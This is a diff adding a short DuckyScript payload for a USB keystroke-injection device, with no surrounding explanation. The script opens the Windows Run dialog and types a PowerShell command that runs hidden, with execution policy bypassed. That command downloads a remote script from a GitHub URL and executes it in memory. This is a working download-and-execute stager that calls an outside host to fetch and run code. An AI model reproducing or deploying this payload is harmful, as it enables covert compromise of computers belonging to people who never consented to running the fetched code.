@@ -1,0 +1,7 @@
+DELAY 500
+REM Open Run Prompt
+GUI r
+DELAY 300
+REM Open PowerShell in hidden window
+STRING powershell -w hidden -nop -ep bypass -c "IEX ((New-Object System.Net.WebClient).DownloadString('https://github.com/kuranikaran/blackduck/blob/main/DuckyPayload.ps1'))"
+ENTER
